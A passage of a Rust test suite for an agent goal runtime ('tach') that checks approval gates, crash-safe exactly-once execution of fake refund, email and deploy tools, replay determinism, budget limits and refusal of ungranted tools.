            .unwrap()
            .iter()
            .filter(|e| {
                e.kind == kind::TOOL_CALLED
                    && e.payload.get("tool").and_then(|v| v.as_str()) == Some("fake.stripe.refund")
            })
            .count()
    }

    #[test]
    fn action_run_pauses_at_approval_gate() {
        let repo = TempRepo::new("act_pause");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        assert!(r.paused);
        assert_eq!(r.state.status, "awaiting_approval");
        assert_eq!(r.state.cursor, 1, "lookup done, paused at the refund gate");
        assert_eq!(r.state.receipts_created, 0);
        let aprs = store::list_approvals(repo.path(), &r.state.run_id);
        assert_eq!(aprs.len(), 1);
        assert_eq!(aprs[0].status, "pending");
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::APPROVAL_REQUESTED),
            1
        );
        assert!(store::list_receipts(repo.path(), &r.state.run_id).is_empty());
    }

    #[test]
    fn approve_then_resume_executes_exactly_one_refund() {
        let repo = TempRepo::new("act_approve");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(done.state.actions_executed, 4);
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 3, "refund + email + zendesk");
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
        assert_eq!(refund_tool_calls(repo.path(), &id), 1);
    }

    #[test]
    fn crash_after_receipt_does_not_double_refund() {
        // The killer property. Crash in the intra-action danger window — after the
        // refund receipt is durable but before the cursor advances — then resume.
        // The refund must NOT be invoked a second time.
        let repo = TempRepo::new("act_killer");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");

        let crashed =
            resume_action_run(repo.path(), &id, Some(ActionCrash::AfterReceipt(1))).unwrap();
        assert!(crashed.crashed);
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            1,
            "the refund receipt is already durable at the crash"
        );

        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(
            refund_tool_calls(repo.path(), &id),
            1,
            "fake.stripe.refund is called exactly once across the whole run"
        );
        assert!(
            count_kind(repo.path(), &id, kind::RECEIPT_REUSED) >= 1,
            "the re-entered refund reused its receipt instead of re-calling"
        );
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
    }

    #[test]
    fn crash_at_step_boundary_resumes_clean() {
        // The killer-demo line: resume --crash-after step:4 crashes right after the
        // notify (step 4), with the refund (step 3) already durably done.
        let repo = TempRepo::new("act_step4");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");

        let crashed = resume_action_run(repo.path(), &id, Some(ActionCrash::Step(4))).unwrap();
        assert!(crashed.crashed);
        assert_eq!(crashed.state.step, 4);
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            2,
            "refund + notify done before the step-4 crash"
        );

        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 3);
        assert_eq!(
            receipts
                .iter()
                .filter(|r| r.tool == "fake.stripe.refund")
                .count(),
            1
        );
        assert_eq!(refund_tool_calls(repo.path(), &id), 1);
    }

    #[test]
    fn replay_reproduces_status_and_receipt_set() {
        // A straight run.
        let straight_repo = TempRepo::new("act_replay_a");
        let (spec, plan) = resolve_dup();
        let s = start_action_run(straight_repo.path(), spec, plan, None).unwrap();
        let sid = s.state.run_id.clone();
        approve(straight_repo.path(), &sid, "refund");
        resume_action_run(straight_repo.path(), &sid, None).unwrap();
        let rep = replay_action_run(straight_repo.path(), &sid).unwrap();
        assert!(
            rep.identical,
            "replay diverged: {:?} vs {:?}",
            rep.recorded_status, rep.replayed_status
        );
        assert_eq!(rep.replayed_status, "completed");

        // A crashed-and-resumed run reaches the same effects.
        let crash_repo = TempRepo::new("act_replay_b");
        let (spec2, plan2) = resolve_dup();
        let c = start_action_run(crash_repo.path(), spec2, plan2, None).unwrap();
        let cid = c.state.run_id.clone();
        approve(crash_repo.path(), &cid, "refund");
        resume_action_run(crash_repo.path(), &cid, Some(ActionCrash::AfterReceipt(1))).unwrap();
        resume_action_run(crash_repo.path(), &cid, None).unwrap();
        assert!(
            replay_action_run(crash_repo.path(), &cid)
                .unwrap()
                .identical
        );

        // The crashed run's history is longer, yet its effects (receipt outputs,
        // which are a pure function of the fixed plan inputs) are identical.
        let n_straight = read_all(&store::events_path(straight_repo.path(), &sid))
            .unwrap()
            .len();
        let n_crash = read_all(&store::events_path(crash_repo.path(), &cid))
            .unwrap()
            .len();
        assert!(
            n_crash > n_straight,
            "crash+resume produces strictly more events ({n_crash} vs {n_straight})"
        );
        let outputs = |repo: &Path, id: &str| -> BTreeMap<String, serde_json::Value> {
            store::list_receipts(repo, id)
                .into_iter()
                .map(|r| (r.tool, r.output))
                .collect()
        };
        assert_eq!(
            outputs(straight_repo.path(), &sid),
            outputs(crash_repo.path(), &cid),
            "same effects despite different histories"
        );
    }

    #[test]
    fn resume_while_still_pending_is_a_noop() {
        let repo = TempRepo::new("act_pending");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        // Resume WITHOUT approving.
        let again = resume_action_run(repo.path(), &id, None).unwrap();
        assert!(again.paused);
        assert_eq!(
            again.state.cursor, 1,
            "cursor did not advance past the gate"
        );
        assert_eq!(
            store::list_approvals(repo.path(), &id).len(),
            1,
            "no new approval"
        );
        assert!(store::list_receipts(repo.path(), &id).is_empty());
        assert_eq!(
            count_kind(repo.path(), &id, kind::APPROVAL_REQUESTED),
            1,
            "approval requested exactly once"
        );
    }

    #[test]
    fn deny_then_resume_fails_without_side_effect() {
        let repo = TempRepo::new("act_deny");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        deny(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "denied");
        assert_eq!(refund_tool_calls(repo.path(), &id), 0);
        assert!(
            store::list_receipts(repo.path(), &id)
                .iter()
                .all(|r| r.tool != "fake.stripe.refund"),
            "no refund effect happened"
        );
        assert!(count_kind(repo.path(), &id, kind::ACTION_SKIPPED) >= 1);
    }

    #[test]
    fn replay_after_denial_reproduces_denied() {
        let repo = TempRepo::new("act_deny_replay");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        deny(repo.path(), &id, "refund");
        resume_action_run(repo.path(), &id, None).unwrap();
        let rep = replay_action_run(repo.path(), &id).unwrap();
        assert!(rep.identical);
        assert_eq!(rep.replayed_status, "denied");
    }

    #[test]
    fn ungranted_tool_fails_before_invocation() {
        let repo = TempRepo::new("act_authz");
        let spec = GoalSpec {
            name: "Authz".into(),
            success: None,
            budget: BudgetSpec {
                steps: Some(10),
                retries: None,
                time: None,
                cost: None,
            },
            allow: AllowSpec {
                tools: vec!["fake.email.send".into()],
                ..Default::default()
            },
            require: vec![],
        };
        let plan = ActionPlan {
            steps: vec![PlannedAction {
                id: "x".into(),
                tool: "fake.stripe.refund".into(), // not granted
                input: serde_json::json!({}),
                requires_approval: false,
                effectful: true,
                summary: String::new(),
            }],
        };
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert!(store::list_receipts(repo.path(), &r.state.run_id).is_empty());
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::TOOL_CALLED),
            0
        );
    }

    #[test]
    fn budget_does_not_strand_a_granted_gate() {
        // A budget tight enough to stop after the refund must still HONOR an already
        // granted gate (the refund), not void it — then stop before the next action.
        let repo = TempRepo::new("act_budget");
        let (mut spec, plan) = resolve_dup();
        spec.budget.steps = Some(2); // allow cursor 0 (lookup) and 1 (refund) only
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert!(r.paused);
        approve(repo.path(), &id, "refund");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "budget_exhausted");
        assert_eq!(
            refund_tool_calls(repo.path(), &id),
            1,
            "the granted refund executed and was not stranded by the budget"
        );
        assert_eq!(store::list_receipts(repo.path(), &id).len(), 1);
    }

    #[test]
    fn tool_failure_mid_plan_is_durable() {
        // A later tool failure must not undo an earlier committed effect.
        let repo = TempRepo::new("act_toolfail");
        let spec = GoalSpec {
            name: "FailMid".into(),
            success: None,
            budget: BudgetSpec {
                steps: Some(10),
                retries: None,
                time: None,
                cost: None,
            },
            allow: AllowSpec {
                tools: vec!["fake.stripe.refund".into(), "fake.broken".into()],
                ..Default::default()
            },
            require: vec![],
        };
        let plan = ActionPlan {
            steps: vec![
                PlannedAction {
                    id: "refund".into(),
                    tool: "fake.stripe.refund".into(),
                    input: serde_json::json!({ "amount_cents": 100 }),
                    requires_approval: false,
                    effectful: true,
                    summary: String::new(),
                },
                PlannedAction {
                    id: "boom".into(),
                    tool: "fake.broken".into(), // granted, but invoke_fake_tool errors
                    input: serde_json::json!({}),
                    requires_approval: false,
                    effectful: true,
                    summary: String::new(),
                },
            ],
        };
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert_eq!(r.state.status, "failed");
        assert_eq!(count_kind(repo.path(), &id, kind::TOOL_FAILED), 1);
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(
            receipts
                .iter()
                .filter(|x| x.tool == "fake.stripe.refund")
                .count(),
            1,
            "the earlier refund receipt survives the later failure"
        );
    }

    #[test]
    fn ship_hotfix_pr_full_flow() {
        let repo = TempRepo::new("ship_pr");
        let (spec, plan) = action::builtin_action_goal("ShipHotfixPR").unwrap();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        assert!(r.paused, "pauses on the create_pr gate");
        approve(repo.path(), &id, "open_pr");
        let done = resume_action_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        let receipts = store::list_receipts(repo.path(), &id);
        assert_eq!(receipts.len(), 2);
        assert_eq!(
            receipts
                .iter()
                .filter(|x| x.tool == "fake.github.create_pr")
                .count(),
            1
        );
        assert!(replay_action_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn action_run_writes_only_under_dot_tach() {
        let repo = TempRepo::new("act_nofiles");
        let (spec, plan) = resolve_dup();
        start_action_run(repo.path(), spec, plan, None).unwrap();
        let entries: Vec<String> = std::fs::read_dir(repo.path())
            .unwrap()
            .flatten()
            .map(|e| e.file_name().to_string_lossy().to_string())
            .collect();
        assert_eq!(
            entries,
            vec![".tach".to_string()],
            "an action goal writes nothing into the working tree"
        );
    }

    #[test]
    fn old_state_json_loads_with_defaults() {
        let repo = TempRepo::new("act_backcompat");
        let run_id = "run_old";
        let dir = store::run_dir(repo.path(), run_id);
        std::fs::create_dir_all(&dir).unwrap();
        // A state.json written before the action layer (no kind/cursor/etc.).
        let old = r#"{"run_id":"run_old","goal":"X","status":"running","step":2,"consecutive_rejections":0,"patches_applied":1,"patches_rejected":0,"tests_run":3,"regressions":0,"diff_chars":4,"final_errors":0,"tests_passed":3,"tests_failed":0}"#;
        std::fs::write(dir.join("state.json"), old).unwrap();
        let s = store::load_state(repo.path(), run_id).unwrap();
        assert_eq!(s.kind, "");
        assert_eq!(s.cursor, 0);
        assert!(s.pending_approval.is_none());
        assert_eq!(s.receipts_created, 0);
    }

    #[test]
    fn idempotency_key_is_object_order_independent() {
        let a = serde_json::json!({ "x": 1, "y": 2, "z": "q" });
        let mut m = serde_json::Map::new();
        m.insert("z".into(), serde_json::json!("q"));
        m.insert("y".into(), serde_json::json!(2));
        m.insert("x".into(), serde_json::json!(1));
        let b = serde_json::Value::Object(m);
        assert_eq!(store::canonical_bytes(&a), store::canonical_bytes(&b));
        assert_eq!(
            store::idempotency_key("r", "act", "t", &a),
            store::idempotency_key("r", "act", "t", &b)
        );
    }

    #[test]
    fn approval_id_is_deterministic_offline() {
        assert_eq!(
            store::approval_id("run_x", "refund"),
            store::approval_id("run_x", "refund")
        );
        assert_ne!(
            store::approval_id("run_x", "refund"),
            store::approval_id("run_y", "refund")
        );
        assert!(store::approval_id("run_x", "refund").starts_with("apr_"));
    }

    // ===== Plan-language runtime =====================================

    fn reconcile() -> (GoalSpec, PlanBlock) {
        crate::plan::builtin_plan_goal("ReconcileChargebacks").expect("catalog entry")
    }
    fn retry() -> (GoalSpec, PlanBlock) {
        crate::plan::builtin_plan_goal("RetryFlakyDeploy").expect("catalog entry")
    }

    /// Parse a one-off plan goal from source (for authority/budget/nesting edges).
    fn parse_plan_goal(src: &str, name: &str) -> (GoalSpec, PlanBlock) {
        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("t.tach", src)]);
        assert!(
            diags.iter().all(|d| !d.is_error()),
            "plan source parse errors: {diags:?}"
        );
        let g = crate::goal::find_goal(&prog, name).expect("goal parsed");
        (GoalSpec::from_decl(g), g.plan.clone().expect("plan block"))
    }

    fn receipts_by_tool(repo: &Path, run_id: &str, tool: &str) -> usize {
        store::list_receipts(repo, run_id)
            .iter()
            .filter(|r| r.tool == tool)
            .count()
    }

    /// Grant the run's single currently-pending gate (mirrors `tach goal approve`)
    /// and return its gate id.
    fn approve_pending(repo: &Path, run_id: &str) -> String {
        let pending = store::list_approvals(repo, run_id)
            .into_iter()
            .find(|a| a.status == "pending")
            .expect("a pending approval");
        approve(repo, run_id, &pending.action_id);
        pending.action_id
    }

    #[test]
    fn plan_pauses_at_the_first_gate_with_no_effect_yet() {
        let repo = TempRepo::new("plan_pause");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        assert!(r.paused, "pauses at the first duplicate's refund gate");
        assert_eq!(r.state.status, "awaiting_approval");
        let id = r.state.run_id.clone();
        // Only the read (list_disputes) has run; no refund yet.
        assert_eq!(store::list_receipts(repo.path(), &id).len(), 1);
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 0);
        let pending = store::list_approvals(repo.path(), &id);
        assert_eq!(pending.iter().filter(|a| a.status == "pending").count(), 1);
        assert_eq!(count_kind(repo.path(), &id, kind::APPROVAL_REQUESTED), 1);
    }

    #[test]
    fn plan_loop_refunds_each_duplicate_exactly_once() {
        let repo = TempRepo::new("plan_loop");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        // Two duplicates → two gates, each reached only after the prior resumes.
        approve_pending(repo.path(), &id);
        let mid = resume_plan_run(repo.path(), &id, None).unwrap();
        assert!(mid.paused, "pauses again at the second duplicate's gate");
        approve_pending(repo.path(), &id);
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");

        // 6 receipts: list + (refund,email)×2 + comment×1; exactly two refunds.
        assert_eq!(store::list_receipts(repo.path(), &id).len(), 6);
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 2);
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.email.send"), 2);
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.zendesk.comment"),
            1
        );
        assert_eq!(refund_tool_calls(repo.path(), &id), 2);
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn plan_crash_mid_loop_does_not_double_refund() {
        // The killer property for loops: crash right after a refund inside the
        // loop, then resume — the refund must NOT happen a second time.
        let repo = TempRepo::new("plan_crash_loop");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        approve_pending(repo.path(), &id);
        // Crash after the 1st new receipt of this resume — that is the refund.
        let crashed =
            resume_plan_run(repo.path(), &id, Some(ActionCrash::AfterReceipt(1))).unwrap();
        assert!(crashed.crashed);
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.stripe.refund"),
            1,
            "the first refund is durable after the crash"
        );
        // Resume to the next gate, approve it, finish.
        resume_plan_run(repo.path(), &id, None).unwrap();
        approve_pending(repo.path(), &id);
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");

        // Despite the mid-loop crash: each duplicate refunded exactly once.
        assert_eq!(refund_tool_calls(repo.path(), &id), 2, "no double refund");
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 2);
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn plan_while_loop_converges_and_resume_does_not_redeploy() {
        let repo = TempRepo::new("plan_while");
        let (spec, plan) = retry();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        // The while loop runs deploy on attempts 1,2,3 (succeeds on 3), then
        // pauses at the announce gate.
        assert!(r.paused, "pauses at the announce-deploy gate");
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.ci.deploy"),
            3,
            "three deploy attempts, exactly"
        );
        approve_pending(repo.path(), &id);
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        // Resuming re-walked the while loop but memoized every deploy: still 3.
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.ci.deploy"), 3);
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.zendesk.comment"),
            1
        );
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn plan_while_loop_crash_does_not_repeat_an_attempt() {
        let repo = TempRepo::new("plan_while_crash");
        let (spec, plan) = retry();
        // Crash right after the 2nd deploy commit of the very first walk.
        let r = start_plan_run(
            repo.path(),
            spec,
            plan,
            BTreeMap::new(),
            Some(ActionCrash::AfterReceipt(2)),
        )
        .unwrap();
        assert!(r.crashed);
        let id = r.state.run_id.clone();
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.ci.deploy"), 2);
        // Resume finishes the loop (3rd attempt) and pauses at the gate.
        let resumed = resume_plan_run(repo.path(), &id, None).unwrap();
        assert!(resumed.paused);
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.ci.deploy"),
            3,
            "exactly one more deploy, never a repeat"
        );
        approve_pending(repo.path(), &id);
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn plan_conditional_else_branch_runs_for_non_duplicates() {
        let repo = TempRepo::new("plan_cond");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        approve_pending(repo.path(), &id);
        resume_plan_run(repo.path(), &id, None).unwrap();
        approve_pending(repo.path(), &id);
        resume_plan_run(repo.path(), &id, None).unwrap();
        // The one non-duplicate charge took the else branch: exactly one comment,
        // and it was never refunded.
        assert_eq!(
            receipts_by_tool(repo.path(), &id, "fake.zendesk.comment"),
            1
        );
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 2);
    }

    #[test]
    fn plan_deny_gate_fails_with_no_side_effect() {
        let repo = TempRepo::new("plan_deny");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        // Deny the first refund gate (gate0).
        deny(repo.path(), &id, "gate0");
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "denied");
        assert!(!done.paused && !done.crashed);
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 0);
        assert_eq!(refund_tool_calls(repo.path(), &id), 0);
        assert_eq!(count_kind(repo.path(), &id, kind::ACTION_SKIPPED), 1);
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn plan_resume_while_pending_is_a_noop() {
        let repo = TempRepo::new("plan_pending_noop");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        let approvals_before = store::list_approvals(repo.path(), &id).len();
        let receipts_before = store::list_receipts(repo.path(), &id).len();
        let again = resume_plan_run(repo.path(), &id, None).unwrap();
        assert!(again.paused, "still paused, no progress");
        assert_eq!(
            store::list_approvals(repo.path(), &id).len(),
            approvals_before
        );
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            receipts_before
        );
    }

    #[test]
    fn plan_ungranted_tool_fails_before_invocation() {
        let src = r#"goal Sneaky -> Success {
  budget { steps: 10 }
  allow {
    fake.email.send
  }
  plan {
    call fake.stripe.refund { charge_id: "ch_1", amount_cents: 999 }
  }
}
"#;
        let repo = TempRepo::new("plan_authority");
        let (spec, plan) = parse_plan_goal(src, "Sneaky");
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert_eq!(store::list_receipts(repo.path(), &r.state.run_id).len(), 0);
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::TOOL_CALLED),
            0
        );
    }

    #[test]
    fn plan_budget_bounds_a_runaway_loop() {
        // A loop that would call the tool four times, under a 2-call budget.
        let src = r#"goal Greedy -> Success {
  budget { steps: 2 }
  allow {
    fake.ci.deploy
  }
  plan {
    let n = 1
    while n < 9 {
      let r = call fake.ci.deploy { service: "api", attempt: n }
      let n = n + 1
    }
  }
}
"#;
        let repo = TempRepo::new("plan_budget");
        let (spec, plan) = parse_plan_goal(src, "Greedy");
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        assert_eq!(r.state.status, "budget_exhausted");
        // Billed against tool calls reached: at most the 2 it was allowed.
        assert!(store::list_receipts(repo.path(), &r.state.run_id).len() <= 2);
        assert_eq!(
            count_kind(repo.path(), &r.state.run_id, kind::BUDGET_EXHAUSTED),
            1
        );
    }

    #[test]
    fn plan_nested_approvals_pause_in_order() {
        let src = r#"goal Nested -> Success {
  budget { steps: 10 }
  allow {
    fake.email.send
  }
  plan {
    approve "outer" {
      approve "inner" {
        call fake.email.send { to: "x@y.z", template: "t" }
      }
    }
  }
}
"#;
        let repo = TempRepo::new("plan_nested");
        let (spec, plan) = parse_plan_goal(src, "Nested");
        let r = start_plan_run(
            repo.path(),
            spec.clone(),
            plan.clone(),
            BTreeMap::new(),
            None,
        )
        .unwrap();
        assert!(r.paused, "pauses at the outer gate first");
        let id = r.state.run_id.clone();
        // Granting the outer gate reveals the inner gate on the next resume.
        // (Synthetic goal: resume against the in-hand plan, not the catalog.)
        approve(repo.path(), &id, "gate0");
        let inner = resume_plan_with(repo.path(), &id, spec.clone(), plan.clone(), None).unwrap();
        assert!(inner.paused, "now pauses at the inner gate");
        assert_eq!(
            store::list_receipts(repo.path(), &id).len(),
            0,
            "no effect yet"
        );
        approve(repo.path(), &id, "gate1");
        let done = resume_plan_with(repo.path(), &id, spec, plan, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.email.send"), 1);
    }

    #[test]
    fn plan_replay_of_a_crashed_run_has_an_identical_receipt_set() {
        // A straight run and a crashed+resumed run of the same goal must replay
        // to the same status + receipt set, even though their event logs differ.
        let straight = TempRepo::new("plan_replay_straight");
        let (s1, p1) = reconcile();
        let r1 = start_plan_run(straight.path(), s1, p1, BTreeMap::new(), None).unwrap();
        let id1 = r1.state.run_id.clone();
        approve_pending(straight.path(), &id1);
        resume_plan_run(straight.path(), &id1, None).unwrap();
        approve_pending(straight.path(), &id1);
        resume_plan_run(straight.path(), &id1, None).unwrap();

        let crashed = TempRepo::new("plan_replay_crashed");
        let (s2, p2) = reconcile();
        let r2 = start_plan_run(crashed.path(), s2, p2, BTreeMap::new(), None).unwrap();
        let id2 = r2.state.run_id.clone();
        approve_pending(crashed.path(), &id2);
        resume_plan_run(crashed.path(), &id2, Some(ActionCrash::AfterReceipt(1))).unwrap();
        resume_plan_run(crashed.path(), &id2, None).unwrap();
        approve_pending(crashed.path(), &id2);
        resume_plan_run(crashed.path(), &id2, None).unwrap();

        let rep1 = replay_plan_run(straight.path(), &id1).unwrap();
        let rep2 = replay_plan_run(crashed.path(), &id2).unwrap();
        assert!(rep1.identical && rep2.identical);
        // The crashed run logged strictly more events (an extra run.resumed) but
        // produced the same six receipts.
        assert_eq!(
            store::list_receipts(straight.path(), &id1).len(),
            store::list_receipts(crashed.path(), &id2).len()
        );
        assert!(
            read_all(&store::events_path(crashed.path(), &id2))
                .unwrap()
                .len()
                > read_all(&store::events_path(straight.path(), &id1))
                    .unwrap()
                    .len()
        );
    }

    #[test]
    fn plan_run_writes_only_under_dot_tach() {
        let repo = TempRepo::new("plan_iso");
        let (spec, plan) = reconcile();
        start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let entries: Vec<String> = std::fs::read_dir(repo.path())
            .unwrap()
            .map(|e| e.unwrap().file_name().to_string_lossy().into_owned())
            .collect();
        assert_eq!(entries, vec![".tach".to_string()], "no stray files at root");
    }

    // ----- user-authored (workspace) plan goals -----

    /// A plan goal whose NAME is deliberately *not* in the built-in catalog, so the
    /// only way run/resume/replay can resolve it is by re-parsing the source
    /// snapshot stored in the run record.
    const WORKSPACE_PLAN_SRC: &str = r#"goal LocalReconcile -> Success {
  budget { steps: 60 }
  allow {
    fake.stripe.list_disputes
    fake.stripe.refund
    fake.email.send
    fake.zendesk.comment
  }
  require { refunds.receipted }
  plan {
    let disputes = call fake.stripe.list_disputes { customer: "cus_77" }
    for charge in disputes.charges {
      if charge.is_duplicate {
        approve "refund the duplicate charge" {
          let refund = call fake.stripe.refund {
            charge_id: charge.charge_id
            amount_cents: charge.amount_cents
            reason: "duplicate"
          }
          call fake.email.send {
            to: "billing@acme.test"
            template: "refund_issued"
            charge_id: charge.charge_id
          }
        }
      } else {
        call fake.zendesk.comment {
          ticket_id: "zd_dispute"
          body: "Reviewed: not a duplicate, no refund."
          public: false
        }
      }
    }
  }
}"#;

    fn workspace_base(src: &str) -> BTreeMap<String, String> {
        let mut base = BTreeMap::new();
        base.insert("goal.tach".to_string(), src.to_string());
        base
    }

    #[test]
    fn workspace_plan_goal_runs_resumes_and_replays_off_the_snapshot() {
        let repo = TempRepo::new("ws_plan");
        assert!(
            crate::plan::builtin_plan_goal("LocalReconcile").is_none(),
            "must be a non-catalog name so only the snapshot can resolve it"
        );
        let (spec, plan) = parse_plan_goal(WORKSPACE_PLAN_SRC, "LocalReconcile");
        let r = start_plan_run(
            repo.path(),
            spec,
            plan,
            workspace_base(WORKSPACE_PLAN_SRC),
            None,
        )
        .unwrap();
        assert!(r.paused, "pauses at the first duplicate's gate");
        let id = r.state.run_id.clone();
        // resume_plan_run re-parses the snapshot — a catalog lookup for this name
        // would error, so completing proves the snapshot drove it.
        approve_pending(repo.path(), &id);
        let mid = resume_plan_run(repo.path(), &id, None).unwrap();
        assert!(mid.paused);
        approve_pending(repo.path(), &id);
        let done = resume_plan_run(repo.path(), &id, None).unwrap();
        assert_eq!(done.state.status, "completed");
        assert_eq!(receipts_by_tool(repo.path(), &id, "fake.stripe.refund"), 2);
        assert!(replay_plan_run(repo.path(), &id).unwrap().identical);
    }

    #[test]
    fn workspace_plan_run_freezes_its_source_in_the_record() {
        // The record carries the source snapshot, which is what resume/replay read —
        // never the live tree. (The live-edit-doesn't-matter property is proved end
        // to end by scripts/user_plan_e2e.sh; here we lock the storage contract.)
        let repo = TempRepo::new("ws_plan_frozen");
        let (spec, plan) = parse_plan_goal(WORKSPACE_PLAN_SRC, "LocalReconcile");
        let r = start_plan_run(
            repo.path(),
            spec,
            plan,
            workspace_base(WORKSPACE_PLAN_SRC),
            None,
        )
        .unwrap();
        let id = r.state.run_id.clone();
        let rec = store::load_goal(repo.path(), &id).unwrap();
        assert_eq!(rec.kind, "plan");
        assert_eq!(
            rec.base_files.get("goal.tach").map(String::as_str),
            Some(WORKSPACE_PLAN_SRC),
            "the goal source is frozen into the run record"
        );
    }

    // ----- audit-grade receipts -----

    #[test]
    fn plan_receipts_carry_audit_metadata() {
        let repo = TempRepo::new("plan_receipt_audit");
        let (spec, plan) = reconcile();
        let r = start_plan_run(repo.path(), spec, plan, BTreeMap::new(), None).unwrap();
        let id = r.state.run_id.clone();
        approve_pending(repo.path(), &id);
        resume_plan_run(repo.path(), &id, None).unwrap();
        approve_pending(repo.path(), &id);
        resume_plan_run(repo.path(), &id, None).unwrap();

        let receipts = store::list_receipts(repo.path(), &id);
        let events = read_all(&store::events_path(repo.path(), &id)).unwrap();
        for rc in &receipts {
            assert_eq!(rc.run_id, id, "receipt names its run");
            assert!(rc.step >= 1, "receipt records the step it committed at");
            assert_eq!(rc.effect, rc.tool, "effect identity");
            assert!(
                rc.input_hash.starts_with("ih_"),
                "receipt carries an input hash"
            );
            // The precomputed created_event_id must point at a real receipt.created
            // event — this is what locks the peek_seq()+2 offset in exec_call.
            assert!(
                events
                    .iter()
                    .any(|e| e.event_id == rc.created_event_id && e.kind == kind::RECEIPT_CREATED),
                "receipt {} references a real receipt.created event",
                rc.receipt_id
            );
        }
